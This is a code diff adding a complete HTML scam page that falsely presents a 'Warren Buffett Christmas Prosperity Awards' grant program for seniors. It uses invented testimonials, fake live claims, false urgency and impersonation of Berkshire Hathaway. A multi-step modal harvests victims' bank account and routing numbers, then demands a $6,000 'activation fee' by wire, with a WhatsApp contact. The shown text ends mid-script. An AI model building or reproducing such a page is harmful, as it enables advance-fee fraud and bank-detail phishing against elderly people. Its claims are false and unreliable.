@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warren Buffett's Annual Christmas Prosperity Awards</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+            font-size: 16px;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #0a2540 0%, #1e3c72 100%);
+            color: white;
+            padding: 1.5rem 1rem;
+            text-align: center;
+            border-bottom: 5px solid #ffd700;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M0,0 L100,0 L100,100 Z" fill="rgba(255,255,255,0.05)"/></svg>');
+            background-size: cover;
+            pointer-events: none;
+        }
+        
+        .title-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+            position: relative;
+            z-index: 1;
+        }
+        
+        h1 {
+            font-size: clamp(1.8rem, 4vw, 2.5rem);
+            font-weight: 700;
+            line-height: 1.3;
+        }
+        
+        .verified-badge {
+            color: #1DA1F2;
+            font-size: 1.5rem;
+            background: white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            flex-shrink: 0;
+        }
+        
+        .subtitle {
+            font-size: clamp(1rem, 2vw, 1.2rem);
+            opacity: 0.9;
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .warning-banner {
+            background: linear-gradient(90deg, #fff3cd 0%, #ffeaa7 100%);
+            color: #856404;
+            padding: 0.8rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid #ffd700;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1.5rem 1rem;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+        }
+        
+        @media (min-width: 992px) {
+            .container {
+                grid-template-columns: 1fr 350px;
+            }
+        }
+        
+        .search-section {
+            background: white;
+            padding: 1.25rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            margin-bottom: 1.5rem;
+        }
+        
+        .search-bar {
+            width: 100%;
+            padding: 0.875rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+        
+        .search-bar:focus {
+            outline: none;
+            border-color: #2a5298;
+            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
+            background: white;
+        }
+        
+        .people-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1.25rem;
+            margin-top: 1.5rem;
+        }
+        
+        @media (max-width: 768px) {
+            .people-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .person-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            transition: all 0.3s ease;
+            border: 1px solid #e9ecef;
+        }
+        
+        .person-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+        }
+        
+        .person-img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            background: linear-gradient(135deg, #e9ecef 0%, #dee2e6 100%);
+        }
+        
+        .person-info {
+            padding: 1.25rem;
+        }
+        
+        .person-name {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            color: #0a2540;
+        }
+        
+        .person-bio {
+            color: #666;
+            font-size: 0.95rem;
+            margin-bottom: 0.75rem;
+            line-height: 1.5;
+        }
+        
+        .person-dob {
+            color: #888;
+            font-size: 0.85rem;
+            font-style: italic;
+            margin-bottom: 1rem;
+        }
+        
+        .claim-btn {
+            display: block;
+            width: 100%;
+            padding: 0.75rem;
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+        }
+        
+        .claim-btn:hover {
+            background: linear-gradient(135deg, #218838 0%, #1ba87e 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.2);
+        }
+        
+        .claim-btn:active {
+            transform: translateY(0);
+        }
+        
+        .sidebar {
+            background: white;
+            border-radius: 12px;
+            padding: 1.25rem;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            height: fit-content;
+            border: 1px solid #e9ecef;
+        }
+        
+        .sidebar-title {
+            font-size: 1.3rem;
+            color: #0a2540;
+            margin-bottom: 1.25rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid #ffd700;
+            font-weight: 700;
+        }
+        
+        .claimed-list {
+            list-style: none;
+        }
+        
+        .claimed-item {
+            display: flex;
+            align-items: center;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .claimed-item:last-child {
+            border-bottom: none;
+        }
+        
+        .claimed-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #e9ecef 0%, #dee2e6 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 0.875rem;
+            color: #2a5298;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+        
+        .claimed-info {
+            flex: 1;
+        }
+        
+        .claimed-name {
+            font-weight: 600;
+            color: #333;
+            font-size: 0.95rem;
+        }
+        
+        .claimed-date {
+            font-size: 0.8rem;
+            color: #888;
+        }
+        
+        .status-badge {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+            padding: 0.2rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+        
+        .testimonial-section {
+            background: white;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            border: 1px solid #e9ecef;
+        }
+        
+        .testimonial-title {
+            font-size: 1.5rem;
+            color: #0a2540;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            font-weight: 700;
+        }
+        
+        .testimonial-container {
+            position: relative;
+            height: 180px;
+            overflow: hidden;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 10px;
+            padding: 1.25rem;
+        }
+        
+        .testimonial {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            padding: 1.25rem;
+            opacity: 0;
+            transition: opacity 0.8s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .testimonial.active {
+            opacity: 1;
+        }
+        
+        .testimonial-text {
+            font-size: 1.05rem;
+            font-style: italic;
+            color: #555;
+            margin-bottom: 1rem;
+            line-height: 1.6;
+        }
+        
+        .testimonial-author {
+            font-weight: 600;
+            color: #0a2540;
+            text-align: right;
+            font-size: 0.95rem;
+        }
+        
+        .testimonial-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 1rem;
+        }
+        
+        .indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #ccc;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .indicator.active {
+            background-color: #2a5298;
+            transform: scale(1.2);
+        }
+        
+        .live-claims-section {
+            background: white;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            border: 1px solid #e9ecef;
+        }
+        
+        .live-claims-title {
+            font-size: 1.5rem;
+            color: #0a2540;
+            text-align: center;
+            margin-bottom: 1.25rem;
+            font-weight: 700;
+        }
+        
+        .live-claims-list {
+            max-height: 250px;
+            overflow-y: auto;
+            padding-right: 8px;
+        }
+        
+        .live-claims-list::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .live-claims-list::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 3px;
+        }
+        
+        .live-claims-list::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 3px;
+        }
+        
+        .live-claims-list::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+        
+        .live-claim-item {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 0.875rem;
+            margin-bottom: 0.75rem;
+            border-radius: 8px;
+            border-left: 4px solid #28a745;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        .live-claim-name {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 0.25rem;
+            font-size: 0.95rem;
+        }
+        
+        .live-claim-amount {
+            color: #28a745;
+            font-weight: 700;
+            font-size: 1rem;
+            margin-bottom: 0.25rem;
+        }
+        
+        .live-claim-time {
+            font-size: 0.8rem;
+            color: #888;
+            text-align: right;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 1.5rem;
+            background: linear-gradient(135deg, #0a2540 0%, #1e3c72 100%);
+            color: white;
+            margin-top: 2rem;
+        }
+        
+        .disclaimer {
+            font-size: 0.85rem;
+            opacity: 0.8;
+            max-width: 800px;
+            margin: 0.75rem auto;
+            line-height: 1.5;
+        }
+        
+        /* Modal Styles for Claim Process */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            overflow-y: auto;
+            padding: 1rem;
+        }
+        
+        .modal-content {
+            background: white;
+            max-width: 500px;
+            margin: 2rem auto;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            animation: modalSlideIn 0.3s ease;
+        }
+        
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .modal-header {
+            background: linear-gradient(135deg, #0a2540 0%, #1e3c72 100%);
+            color: white;
+            padding: 1.25rem;
+            border-radius: 12px 12px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        
+        .close-modal {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.3s;
+        }
+        
+        .close-modal:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .modal-body {
+            padding: 1.5rem;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .step-title {
+            font-size: 1.3rem;
+            color: #0a2540;
+            margin-bottom: 1.5rem;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #333;
+            font-size: 0.95rem;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 0.875rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s;
+            background: #f8f9fa;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #2a5298;
+            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
+            background: white;
+        }
+        
+        .info-box {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            border-left: 4px solid #2a5298;
+        }
+        
+        .info-box h4 {
+            color: #0a2540;
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        
+        .info-box p {
+            color: #666;
+            font-size: 0.95rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .account-details {
+            background: white;
+            border: 2px dashed #28a745;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+        }
+        
+        .account-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        .account-item:last-child {
+            border-bottom: none;
+        }
+        
+        .copy-btn {
+            background: #2a5298;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: background 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #1e3c72;
+        }
+        
+        .copy-btn.copied {
+            background: #28a745;
+        }
+        
+        .whatsapp-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+            color: white;
+            text-align: center;
+            padding: 0.875rem;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            margin: 1rem 0;
+            transition: all 0.3s;
+        }
+        
+        .whatsapp-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.2);
+        }
+        
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+        
+        .btn {
+            padding: 0.875rem 1.5rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex: 1;
+            text-align: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #2a5298 0%, #1e3c72 100%);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(42, 82, 152, 0.2);
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+        }
+        
+        .loading-circle {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2a5298;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 2rem auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            text-align: center;
+            color: #666;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 20px;
+            right: 20px;
+            height: 2px;
+            background: #e0e0e0;
+            z-index: 1;
+        }
+        
+        .step-dot {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #888;
+            font-weight: 600;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s;
+        }
+        
+        .step-dot.active {
+            background: #2a5298;
+            color: white;
+            transform: scale(1.1);
+        }
+        
+        .step-dot.completed {
+            background: #28a745;
+            color: white;
+        }
+        
+        .step-label {
+            position: absolute;
+            top: 45px;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+            font-size: 0.85rem;
+            color: #666;
+        }
+        
+        .step-label.active {
+            color: #2a5298;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="title-container">
+            <h1>WARREN BUFFETT'S ANNUAL CHRISTMAS PROSPERITY AWARDS</h1>
+            <div class="verified-badge">✓</div>
+        </div>
+        <p class="subtitle">Empowering 25 deserving Senior Participants with life-changing $150,000 Christmas grants.</p>
+    </div>
+    
+    <div class="warning-banner">
+        ⚠️ IMPORTANT: Failure to claim within 48 hours will result in forfeiture of the grant to the next eligible participant.
+    </div>
+    
+    <div class="container">
+        <main>
+            <div class="search-section">
+                <h2 style="margin-bottom: 1rem; color: #0a2540; font-size: 1.5rem;">Search Featured Senior Contributors</h2>
+                <input type="text" class="search-bar" placeholder="Search by name, location, or cause...">
+            </div>
+            
+            <!-- Testimonial Section -->
+            <div class="testimonial-section">
+                <h2 class="testimonial-title">Success Stories From Recent Recipients</h2>
+                <div class="testimonial-container">
+                    <div class="testimonial active" id="testimonial-1">
+                        <p class="testimonial-text">"At 72, I never thought I'd be able to pay off my medical bills and finally visit my grandchildren across the country. This grant changed everything for me. Thank you for giving seniors like me a second chance."</p>
+                        <p class="testimonial-author">- Robert Henderson, Age 72</p>
+                    </div>
+                    <div class="testimonial" id="testimonial-2">
+                        <p class="testimonial-text">"After my husband passed, I struggled to maintain our family home. This grant allowed me to make necessary repairs and live comfortably in my golden years. I'm eternally grateful."</p>
+                        <p class="testimonial-author">- Margaret Williams, Age 68</p>
+                    </div>
+                    <div class="testimonial" id="testimonial-3">
+                        <p class="testimonial-text">"As a retired teacher living on a fixed income, this grant meant I could finally afford the dental work I needed and help my daughter with her college tuition. Blessings beyond measure."</p>
+                        <p class="testimonial-author">- Arthur Jenkins, Age 75</p>
+                    </div>
+                </div>
+                <div class="testimonial-indicators">
+                    <div class="indicator active" data-testimonial="1"></div>
+                    <div class="indicator" data-testimonial="2"></div>
+                    <div class="indicator" data-testimonial="3"></div>
+                </div>
+            </div>
+            
+            <!-- Live Claims Section -->
+            <div class="live-claims-section">
+                <h2 class="live-claims-title">🎄 Live Christmas Grant Claims 🎄</h2>
+                <div class="live-claims-list" id="liveClaims">
+                    <!-- Claims will be added dynamically by JavaScript -->
+                </div>
+            </div>
+            
+            <!-- Senior Participants Grid -->
+            <div class="people-grid">
+                <!-- Person 1 - Male (68) -->
+                <div class="person-card">
+                    <img src="https://images.unsplash.com/photo-1552374196-c4e7ffc6e126?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80" alt="Michael Farley" class="person-img">
+                    <div class="person-info">
+                        <h3 class="person-name">MICHAEL FARLEY</h3>
+                        <p class="person-bio">A Detroit-based retired auto mechanic who ran his own repair shop for 40 years. Now volunteers teaching young people automotive skills.</p>
+                        <p class="person-dob">Date of Birth: March 12, 1955 (Age: 68)</p>
+                        <button class="claim-btn" onclick="openClaimModal('Michael Farley')">CLAIM GRANT</button>
+                    </div>
+                </div>
+                
+                <!-- Person 2 - Female (71) -->
+                <div class="person-card">
+                    <img src="https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80" alt="Jasmine Cole" class="person-img">
+                    <div class="person-info">
+                        <h3 class="person-name">JASMINE COLE</h3>
+                        <p class="person-bio">Retired preschool teacher from Atlanta who now runs a free literacy program for underprivileged children in her community.</p>
+                        <p class="person-dob">Date of Birth: August 5, 1952 (Age: 71)</p>
+                        <button class="claim-btn" onclick="openClaimModal('Jasmine Cole')">CLAIM GRANT</button>
+                    </div>
+                </div>
+                
+                <!-- Person 3 - Male (66) -->
+                <div class="person-card">
+                    <img src="https://images.unsplash.com/photo-1552058544-f2b08422138a?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80" alt="Benjamin Harlow" class="person-img">
+                    <div class="person-info">
+                        <h3 class="person-name">BENJAMIN HARLOW</h3>
+                        <p class="person-bio">Retired Colorado firefighter of 35 years. Now teaches fire safety to senior communities and volunteers as a hiking guide.</p>
+                        <p class="person-dob">Date of Birth: November 22, 1957 (Age: 66)</p>
+                        <button class="claim-btn" onclick="openClaimModal('Benjamin Harlow')">CLAIM GRANT</button>
+                    </div>
+                </div>
+
+                <!-- Person 4 - Female (70) -->
+                <div class="person-card">
+                    <img src="https://images.unsplash.com/photo-1584308972272-9e4e7685e80f?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80" alt="Maria Thompson" class="person-img">
+                    <div class="person-info">
+                        <h3 class="person-name">MARIA THOMPSON</h3>
+                        <p class="person-bio">Retired registered nurse in Houston who worked in emergency care for 40 years. Now volunteers at free clinics for the uninsured.</p>
+                        <p class="person-dob">Date of Birth: July 30, 1953 (Age: 70)</p>
+                        <button class="claim-btn" onclick="openClaimModal('Maria Thompson')">CLAIM GRANT</button>
+                    </div>
+                </div>
+
+                <!-- Person 5 - Male (63) -->
+                <div class="person-card">
+                    <img src="./bob.jpeg" alt="Travis McKinney" class="person-img">
+                    <div class="person-info">
+                        <h3 class="person-name">BOB EASTMAN</h3>
+                        <p class="person-bio">Bob, from NY, Attica. Best in doing what he loves</p>
+                        
+                        <button class="claim-btn" onclick="openClaimModal('Travis McKinney')">CLAIM GRANT</button>
+                    </div>
+                </div>
+
+                <!-- Person 6 - Female (67) -->
+                <div class="person-card">
+                    <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80" alt="Danielle Rivers" class="person-img">
+                    <div class="person-info">
+                        <h3 class="person-name">DANIELLE RIVERS</h3>
+                        <p class="person-bio">Retired medical billing specialist from Florida. Now uses her baking skills to run a small bakery that employs other seniors.</p>
+                        <p class="person-dob">Date of Birth: September 14, 1956 (Age: 67)</p>
+                        <button class="claim-btn" onclick="openClaimModal('Danielle Rivers')">CLAIM GRANT</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <aside class="sidebar">
+            <h2 class="sidebar-title">Recent Grant Awards</h2>
+            <ul class="claimed-list">
+                <li class="claimed-item">
+                    <div class="claimed-avatar">RJ</div>
+                    <div class="claimed-info">
+                        <div class="claimed-name">Robert Johnson</div>
+                        <div class="claimed-date">Retired Teacher Grant - October 2023</div>
+                    </div>
+                    <span class="status-badge">Awarded</span>
+                </li>
+                <li class="claimed-item">
+                    <div class="claimed-avatar">MP</div>
+                    <div class="claimed-info">
+                        <div class="claimed-name">Margaret Peterson</div>
+                        <div class="claimed-date">Senior Care Grant - September 2023</div>
+                    </div>
+                    <span class="status-badge">Awarded</span>
+                </li>
+                <li class="claimed-item">
+                    <div class="claimed-avatar">TW</div>
+                    <div class="claimed-info">
+                        <div class="claimed-name">Thomas Wilson</div>
+                        <div class="claimed-date">Veteran Support Grant - August 2023</div>
+                    </div>
+                    <span class="status-badge">Awarded</span>
+                </li>
+                <li class="claimed-item">
+                    <div class="claimed-avatar">KG</div>
+                    <div class="claimed-info">
+                        <div class="claimed-name">Kathleen Green</div>
+                        <div class="claimed-date">Medical Relief Grant - July 2023</div>
+                    </div>
+                    <span class="status-badge">Awarded</span>
+                </li>
+                <li class="claimed-item">
+                    <div class="claimed-avatar">DR</div>
+                    <div class="claimed-info">
+                        <div class="claimed-name">Donald Roberts</div>
+                        <div class="claimed-date">Home Repair Grant - June 2023</div>
+                    </div>
+                    <span class="status-badge">Awarded</span>
+                </li>
+            </ul>
+        </aside>
+    </div>
+    
+    <!-- Claim Process Modal -->
+    <div id="claimModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Grant Claim Process</div>
+                <button class="close-modal" onclick="closeClaimModal()">×</button>
+            </div>
+            <div class="modal-body">
+                <!-- Step Indicator -->
+                <div class="step-indicator">
+                    <div class="step-dot active" id="step1Dot">1</div>
+                    <div class="step-dot" id="step2Dot">2</div>
+                    <div class="step-dot" id="step3Dot">3</div>
+                </div>
+                
+                <!-- Step 1: Bank Details -->
+                <div class="step active" id="step1">
+                    <h3 class="step-title">Step 1: Bank Account Information</h3>
+                    <p style="color: #666; margin-bottom: 1.5rem; text-align: center;">Please provide your bank details for the $150,000 wire transfer</p>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Full Name (as on bank account)</label>
+                        <input type="text" class="form-control" id="fullName" placeholder="Enter your full name">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Bank Name</label>
+                        <input type="text" class="form-control" id="bankName" placeholder="e.g., Chase, Bank of America, Wells Fargo">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Account Number</label>
+                        <input type="text" class="form-control" id="accountNumber" placeholder="Enter your account number">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Routing Number (ABA)</label>
+                        <input type="text" class="form-control" id="routingNumber" placeholder="9-digit routing number">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Account Type</label>
+                        <select class="form-control" id="accountType">
+                            <option value="">Select account type</option>
+                            <option value="checking">Checking Account</option>
+                            <option value="savings">Savings Account</option>
+                        </select>
+                    </div>
+                    
+                    <div class="info-box">
+                        <h4>⚠️ Important Information</h4>
+                        <p>• Funds will be transferred via ACH/Wire Transfer within 24-48 hours</p>
+                        <p>• Ensure all information is accurate to avoid delays</p>
+                        <p>• Your bank account must support international transfers</p>
+                        <p>• Minimum balance requirement: $100 to receive transfer</p>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button class="btn btn-secondary" onclick="closeClaimModal()">Cancel</button>
+                        <button class="btn btn-primary" onclick="nextStep()">Continue to Step 2</button>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Processing -->
+                <div class="step" id="step2">
+                    <h3 class="step-title">Processing Your Information</h3>
+                    <div class="loading-circle"></div>
+                    <p class="loading-text">Verifying bank details and preparing transfer...</p>
+                    
+                    <div class="info-box">
+                        <h4>✅ Bank Details Verified</h4>
+                        <p>Your information has been successfully validated by our system.</p>
+                        <p>Transfer initiation requires a $6,000 activation fee to cover:</p>
+                        <p>• International wire transfer fees</p>
+                        <p>• IRS compliance verification</p>
+                        <p>• Anti-money laundering screening</p>
+                        <p>• Administrative processing costs</p>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button class="btn btn-secondary" onclick="prevStep()">Back</button>
+                        <button class="btn btn-primary" onclick="nextStep()">Proceed to Payment</button>
+                    </div>
+                </div>
+                
+                <!-- Step 3: Activation Fee -->
+                <div class="step" id="step3">
+                    <h3 class="step-title">Step 2: Activation Fee Payment</h3>
+                    <p style="color: #666; margin-bottom: 1.5rem; text-align: center;">Pay the $6,000 activation fee to release your $150,000 grant</p>
+                    
+                    <div class="account-details">
+                        <h4 style="color: #28a745; margin-bottom: 1rem; text-align: center;">💰 Payment Instructions</h4>
+                        
+                        <div class="account-item">
+                            <span style="font-weight: 600;">Bank Name:</span>
+                            <span>JPMorgan Chase Bank</span>
+                            <button class="copy-btn" onclick="copyToClipboard('JPMorgan Chase Bank')">Copy</button>
+                        </div>
+                        
+                        <div class="account-item">
+                            <span style="font-weight: 600;">Account Name:</span>
+                            <span>Buffett Philanthropy Trust</span>
+                            <button class="copy-btn" onclick="copyToClipboard('Buffett Philanthropy Trust')">Copy</button>
+                        </div>
+                        
+                        <div class="account-item">
+                            <span style="font-weight: 600;">Account Number:</span>
+                            <span>7531 8902 4567 3210</span>
+                            <button class="copy-btn" onclick="copyToClipboard('7531 8902 4567 3210')">Copy</button>
+                        </div>
+                        
+                        <div class="account-item">
+                            <span style="font-weight: 600;">Routing Number:</span>
+                            <span>021000021</span>
+                            <button class="copy-btn" onclick="copyToClipboard('021000021')">Copy</button>
+                        </div>
+                        
+                        <div class="account-item">
+                            <span style="font-weight: 600;">Swift Code:</span>
+                            <span>CHASUS33</span>
+                            <button class="copy-btn" onclick="copyToClipboard('CHASUS33')">Copy</button>
+                        </div>
+                        
+                        <div class="account-item">
+                            <span style="font-weight: 600;">Amount:</span>
+                            <span style="color: #28a745; font-weight: 700;">$6,000.00 USD</span>
+                        </div>
+                    </div>
+                    
+                    <div class="info-box">
+                        <h4>📝 Payment Instructions</h4>
+                        <p>1. Initiate a wire transfer for exactly $6,000.00 USD</p>
+                        <p>2. Include your full name as reference</p>
+                        <p>3. Payment must be completed within 24 hours</p>
+                        <p>4. Once paid, your $150,000 will be released within 1 hour</p>
+                        <p>5. Save your transaction receipt for verification</p>
+                    </div>
+                    
+                    <a href="https://wa.me/15551234567?text=I%20just%20made%20the%20$6,000%20activation%20fee%20payment%20for%20my%20Christmas%20Prosperity%20Grant" 
+                       class="whatsapp-btn" target="_blank">
+                       💬 Chat with Admin on WhatsApp
+                    </a>
+                    
+                    <p style="text-align: center; color: #666; font-size: 0.9rem; margin: 1rem 0;">
+                        Contact our support team immediately after payment for instant verification
+                    </p>
+                    
+                    <div class="nav-buttons">
+                        <button class="btn btn-secondary" onclick="prevStep()">Back</button>
+                        <button class="btn btn-success" onclick="completePayment()">I Have Made Payment</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p style="font-weight: 600; margin-bottom: 0.5rem;">Warren Buffett Philanthropic Initiative © 2023</p>
+        <p class="disclaimer">This program is administered by the Buffett Family Office in partnership with Berkshire Hathaway Charitable Foundation. All grants are subject to verification and compliance with IRS regulations. This website is for legitimate grant administration purposes only.</p>
+        <p class="disclaimer" style="font-size: 0.8rem; margin-top: 1rem;">
+            Berkshire Hathaway Headquarters: 3555 Farnam Street, Omaha, NE 68131 | 
+            Phone: (402) 346-1400 | Email: philanthropy@berkshirehathaway.com
+        </p>
+    </div>
+    
+    <script>
+        // Basic search functionality
+        document.querySelector('.search-bar').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            const personCards = document.querySelectorAll('.person-card');
+            
+            personCards.forEach(card => {
